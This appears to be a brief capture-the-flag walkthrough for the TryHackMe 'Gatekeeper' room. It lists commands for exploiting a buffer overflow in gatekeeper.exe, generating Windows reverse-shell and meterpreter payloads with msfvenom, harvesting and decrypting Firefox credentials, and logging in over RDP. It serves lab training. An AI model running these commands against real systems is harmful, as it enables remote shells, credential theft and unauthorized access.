# Writeup for [Gatekeeper](https://tryhackme.com/room/gatekeeper)


```
set -gx IP 10.10.8.63
```


## Task 1: Approach the Gates

* start the machine


## Task 2: Defeat the Gatekeeper and pass through the fire


* default nmap scan `sudo nmap -sV -A -Pn -oN nmap/initial $IP`
* get `gatekeeper.exe`-file from smbclient `smbclient -L \\$IP`, `smbclient \\$IP\Users`
* run `gatekeeper.exe` in Immunity Debugger
* had to install VCRuntime140.dll for x32 bit
* find limit with `nc $IP 31337`
* and put output of `python -c 'print("A" * 100)'`
* after length found exploit with `pattern_create -l <length>`
* after exploiting find distance with `pattern_offset -q <esp-address>`
* add all hex values and generate bytearray `!mona bytearray -b "\x00\x0a"`
* compare bytearrays `!mona compare ....`
* generate reverse shell `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 -b "\x00\x0a" -f python --var-name shellcode EXITFUNC=thread`
* start listener `nc -lnvp 4444`
* read user.txt.txt
* generate msf reverse shell  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=4444 -b "\x00\x0a" -f python --var-name shellcode EXITFUNC=thread`
* paste in exploit and run `python exploit.py`
* start listener
  * `msfconsole`
  * `use multi/handler`
  * `set lhost tun0`
  * `set payload windows/meterpreter/reverse_tcp`
  * `run`
* gather information `run post/windows/gather/enum_applications`
* gather information `run post/multi/gather/firefox_credentials`
* rename gathered firefox data
* download firefox decryption tool [here](https://github.com/unode/firefox_decrypt)
* run firefox decryption tool `python firefox_decrypt /home/<user>/.msf4/loot/`
* login as root user using xfreerdp `xfreerdp /u:<root-user> /p:<password> /cert:ignore /v:$IP /workarea`
